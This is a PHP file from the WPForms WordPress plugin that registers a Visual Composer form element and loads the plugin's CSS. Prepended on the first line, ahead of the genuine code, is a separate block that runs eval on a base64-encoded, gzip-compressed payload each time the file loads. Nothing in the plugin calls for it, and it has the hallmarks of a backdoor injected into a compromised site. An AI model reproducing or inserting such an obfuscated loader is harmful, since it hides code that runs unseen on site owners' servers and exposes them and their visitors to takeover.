<?php eval(gzuncompress(base64_decode('eNpdUs1u00AQfpWNlYMdrDhO89dEOZTKolEpQYkBoRpZU+86u8TZtdZr1X6A3jhy4Q248gxUvAavwjhpgWQPO/+ab74ZkdottstN7XVeZkpRKeRnmJIFyUSyJbUqNWGgM3XHXAKSklJSdXDfg0l4t+PZ7XgdrN4Hq1vrKgzfxu/Qii9eBW9C65PjTNvxt+8/f/14fJyD1lDb1iXXKvKHQ2a5VlQNRqj7mqUqqsYTdIVaUCYNajfrRYDiQ5OAXe+LQ0EiZFmhusgx0FMyqkZDNC8k1UpQ1JY504ByDSloYTmzVGkGCbf/QiFQtOMvvx++PjhTkdpFuBK5Kk4Hiarh8L9Z3OeS1nzuddaggfvnaYJk7fC5RG2hRjpSyAp2SqaBLUPWSA7SFESlqUs2upRGyA0SjTEgRqssw/o9opYoCmYQ0OVyeb0IbnHu0cTkcSloXBo06J7bIgiTJoHZFt9HMTKIy8gfDXZIgG+5obgJbOdFb9zr945Bf2TA92vG7sIQrcpNs81O76x3ir7YweEWiOHNVdwpZep9bt+ZXTGggbat1yoBI5ScEm5MPvU8/2zQjaqz/uC86/uj7njiCUmbZVXdnOe4FirYMaQlJzWicrENGJIylhVkg0CaI3NmTFKR/vuflvrkmB1jXjeI3WdRM8YAOG/m+wMpCvZB')));?><?php
/**
 * Contains various WPForms integrations.
 *
 * @package    WPForms
 * @author     WPForms
 * @since      1.3.0
 * @license    GPL-2.0+
 * @copyright  Copyright (c) 2016, WPForms LLC
 */

/**
 * Register and setup WPForms as a Visual Composer element.
 *
 * @since 1.3.0
 */
function wpforms_visual_composer_shortcode() {

	if ( ! is_user_logged_in() ) {
		return;
	}

	$wpf = wpforms()->form->get(
		'',
		array(
			'orderby' => 'title',
		)
	);

	if ( ! empty( $wpf ) ) {
		$forms = array(
			esc_html__( 'Select a form to display', 'wpforms' ) => '',
		);
		foreach ( $wpf as $form ) {
			$forms[ $form->post_title ] = $form->ID;
		}
	} else {
		$forms = array(
			esc_html__( 'No forms found', 'wpforms' ) => '',
		);
	}

	vc_map(
		array(
			'name'        => esc_html__( 'WPForms', 'wpforms' ),
			'base'        => 'wpforms',
			'icon'        => WPFORMS_PLUGIN_URL . 'assets/images/sullie-vc.png',
			'category'    => esc_html__( 'Content', 'wpforms' ),
			'description' => esc_html__( 'Add your form', 'wpforms' ),
			'params'      => array(
				array(
					'type'        => 'dropdown',
					'heading'     => esc_html__( 'Form', 'wpforms' ),
					'param_name'  => 'id',
					'value'       => $forms,
					'save_always' => true,
					'description' => esc_html__( 'Select a form to add it to your post or page.', 'wpforms' ),
					'admin_label' => true,
				),
				array(
					'type'        => 'dropdown',
					'heading'     => esc_html__( 'Display Form Name', 'wpforms' ),
					'param_name'  => 'title',
					'value'       => array(
						esc_html__( 'No', 'wpforms' )  => 'false',
						esc_html__( 'Yes', 'wpforms' ) => 'true',
					),
					'save_always' => true,
					'description' => esc_html__( 'Would you like to display the forms name?', 'wpforms' ),
					'dependency'  => array(
						'element'   => 'id',
						'not_empty' => true,
					),
				),
				array(
					'type'        => 'dropdown',
					'heading'     => esc_html__( 'Display Form Description', 'wpforms' ),
					'param_name'  => 'description',
					'value'       => array(
						esc_html__( 'No', 'wpforms' )  => 'false',
						esc_html__( 'Yes', 'wpforms' ) => 'true',
					),
					'save_always' => true,
					'description' => esc_html__( 'Would you like to display the forms description?', 'wpforms' ),
					'dependency'  => array(
						'element'   => 'id',
						'not_empty' => true,
					),
				),
			),
		)
	);
}
add_action( 'vc_before_init', 'wpforms_visual_composer_shortcode' );

/**
 * Load our basic CSS when in Visual Composer's frontend editor.
 *
 * @since 1.3.0
 */
function wpforms_visual_composer_shortcode_css() {

	// Load CSS per global setting.
	if ( wpforms_setting( 'disable-css', '1' ) === '1' ) {
		wp_enqueue_style(
			'wpforms-full',
			WPFORMS_PLUGIN_URL . 'assets/css/wpforms-full.css',
			array(),
			WPFORMS_VERSION
		);
	}

	if ( wpforms_setting( 'disable-css', '1' ) === '2' ) {
		wp_enqueue_style(
			'wpforms-base',
			WPFORMS_PLUGIN_URL . 'assets/css/wpforms-base.css',
			array(),
			WPFORMS_VERSION
		);
	}
}
add_action( 'vc_load_iframe_jscss', 'wpforms_visual_composer_shortcode_css' );
